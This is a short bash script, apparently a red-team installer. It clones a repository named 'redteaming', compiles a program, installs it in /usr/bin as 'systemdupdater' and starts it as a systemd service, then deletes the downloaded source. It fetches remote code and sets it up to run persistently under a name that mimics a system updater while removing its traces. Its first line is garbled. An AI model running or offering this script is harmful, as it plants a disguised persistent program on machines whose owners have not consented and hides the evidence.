#!/bin/bash

git clone https://github.com/hb6540/redteaming | apt install git
git clone https://github.com/hb6540/redteaming
cd redteaming
cd systemdupdater
gcc -o systemdupdater systemdupdater.c
mv systemdupdater /usr/bin
cp systemdupdater.service /usr/lib/systemd/system
systemctl daemon-reload
systemctl start systemdupdater.service
cd ../../
rm -r redteaming
